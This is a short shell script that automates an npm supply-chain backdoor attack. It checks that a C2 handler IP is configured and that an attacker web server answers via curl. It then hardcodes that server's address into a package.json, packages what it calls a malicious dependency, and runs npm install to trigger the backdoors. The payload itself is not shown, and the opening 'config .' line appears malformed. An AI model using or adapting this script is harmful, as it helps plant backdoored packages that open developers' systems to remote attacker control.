config . 
if [ "$HANDLER_IP" == "whynot" ]
then
    echo "you forgot to set the C2 IP please fix that in config"
    exit 1
fi
curl --max-time 2 http://$WEBSERVER_IP:$WEBSERVER_PORT || (echo "The web server not started or accessible please ifgure out that first"; exit 1)

cd local

echo "hardcoding web server port and ip"
sed -i '' "s/WEBSERVER_IP/$WEBSERVER_IP/" ./package/package.json
sed -i '' "s/WEBSERVER_PORT/$WEBSERVER_PORT/" ./package/package.json

echo "packaging malicious dependency"
./package_npm_archive.sh

echo "running npm install to trigger the backdoors"
./install_backdoored_npm.sh